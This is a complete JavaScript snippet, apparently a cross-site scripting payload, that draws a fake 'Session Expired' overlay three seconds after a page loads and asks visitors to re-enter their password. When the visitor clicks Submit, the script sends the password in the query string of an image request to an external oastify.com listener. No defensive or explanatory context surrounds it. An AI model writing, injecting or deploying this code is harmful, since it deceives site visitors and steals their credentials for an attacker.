window.addEventListener('load', function() {
    // Simulate session expiration after 3 seconds (or set your preferred timeout)
    setTimeout(function() {
        // Show a message and an input field after timeout
        let message = document.createElement('div');
        message.style.position = 'fixed';
        message.style.top = '30%';
        message.style.left = '50%';
        message.style.transform = 'translate(-50%, -50%)';
        message.style.background = 'white';
        message.style.padding = '20px';
        message.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
        message.style.zIndex = '9999';
        message.innerHTML = `
            <h2>Session Expired</h2>
            <p>Please re-enter your password:</p>
            <input type="password" id="password" placeholder="Enter password" required>
            <button id="submit">Submit</button>
        `;
        
        document.body.appendChild(message);

        // Add event listener for the submit button
        document.getElementById('submit').addEventListener('click', function() {
            let password = document.getElementById('password').value;
            if (password) {
                new Image().src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
                message.innerHTML = "<p>Loading...</p>";  // After submission
            }
        });
    }, 3000); // Delay the prompt for 3 seconds (or change as needed)
});
